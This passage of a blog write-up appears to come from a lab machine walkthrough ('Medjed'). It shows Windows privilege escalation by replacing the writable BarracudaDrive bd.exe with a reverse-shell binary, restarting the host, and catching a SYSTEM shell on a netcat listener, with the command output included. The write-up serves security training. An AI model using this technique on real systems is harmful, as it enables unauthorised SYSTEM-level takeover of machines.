id="https://www.notion.so/25d0b98a88f78076b16cdf4bf83e1844" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It seemed to be set up properly. Most importantly BD identified it as a dynamic LSP app.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f78069ab8dc135fae9e473" class="Image Image--PageWidth"><figure><a href="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/privesc_revshell.png"><img src="https://raw.githubusercontent.com/ch3ng625/blog_images/refs/heads/main/medjed/privesc_revshell.png" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/25d0b98a88f780c2b900fcae74763fdd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I clicked on the link and the page hanged, but a SYSTEM shell was sent back.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780d4ae8cdef301b77f90" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [192.168.45.160] from (UNKNOWN) [192.168.200.127] 49777
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\bd&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/25c0b98a88f780c3b11ecb7ef0806602" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f78079b878e12365342ae1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780c48737e8d312e5a10d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Administrator\Desktop&gt;</span></mark></span><span class="SemanticString"><span> type proof.txt
+
+ca6d772b************************</span></span></span></code></pre><div id="https://www.notion.so/25c0b98a88f78063ac84e7552f980356" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f7814fbedaf60d32de3fb7" class="Divider"></div><h3 id="https://www.notion.so/25c0b98a88f78178a5f4f930de82d5ab" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/25c0b98a88f78178a5f4f930de82d5ab"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Intended Path:</span></span></h3><div id="https://www.notion.so/25d0b98a88f780e3814af9e741542ca7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar to the foothold exploit, the intended escalation path was not what I did. In fact, it’s the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.exploit-db.com/exploits/48789">public exploit</a></span><span class="SemanticString"> that I’ve also identified earlier.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f780dd9e62c940e8514ad2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The exploit essentially leverages overly permissive privileges granted during the default installation of BarracudaDrive. As a member of the Authenticated Users group, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">jerren</code></span><span class="SemanticString"> has write access to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\bd\</code></span><span class="SemanticString">, which allows replacing the BarracudaDrive executable with something malicious. When the system restarts, it’ll be executed by SYSTEM.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780b5a0bfd0a7d4f84da5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Jerren\Desktop&gt;</span></mark></span><span class="SemanticString"><span> icacls c:\bd\
+
+c:\bd\ BUILTIN\Administrators:(I)(OI)(CI)(F)
+       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+       BUILTIN\Users:(I)(OI)(CI)(RX)
+       NT AUTHORITY\Authenticated Users:(I)(M)
+       NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
+
+Successfully processed 1 files; Failed processing 0 files</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780f3b2add70b6223b7fe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I initially thought it’s impossible, since </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeShutdownPrivilege</code></span><span class="SemanticString"> was disabled for the user.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f78010b63dd7146c41b34b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\Users\Jerren\Desktop&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State   
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780ea982beaf79afc1bf1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Turns out I misunderstood what “Disabled” means. All the listed privileges have already been granted to the user, “disabled” just means the privilege is not active in the current session. Most privileges need to be explicitly enabled before they can be used, but some system utilities such as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">shutdown</code></span><span class="SemanticString"> internally enable the necessary privileges before performing the action. As such the user would still be able to perform a system restart.</span></span></p></div><div id="https://www.notion.so/25d0b98a88f7802b8565c33db04715e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Back to the exploit, it’s actually much more simple than what I did. All that’s required is to replace </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bd.exe</code></span><span class="SemanticString"> with the reverse shell binary.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f7805cba21c50187a5e6f8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\bd&gt;</span></mark></span><span class="SemanticString"><span> move bd.exe bd_backup.exe
+
+        1 file(s) moved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\bd&gt;</span></mark></span><span class="SemanticString"><span> copy c:\users\public\downloads\shell.exe bd.exe
+
+        1 file(s) copied.</span></span></span></code></pre><div id="https://www.notion.so/25d0b98a88f780109053fc560467181b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll restart the box by running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">shutdown /r</code></span><span class="SemanticString"> and wait. It took a while, but eventually a SYSTEM shell was sent back.</span></span></p></div><pre id="https://www.notion.so/25c0b98a88f780f48613e3d2cac921ab" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/medjed]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [192.168.45.160] from (UNKNOWN) [192.168.221.127] 49668
+Microsoft Windows [Version 10.0.19042.1387]
+(c) Microsoft Corporation. All rights reserved.
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\WINDOWS\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+nt authority\system
+</span></span></span></code></pre><div id="https://www.notion.so/25c0b98a88f7804d907ef87fe298ffe8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/25c0b98a88f78013891ec6ad3f16a7fa" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
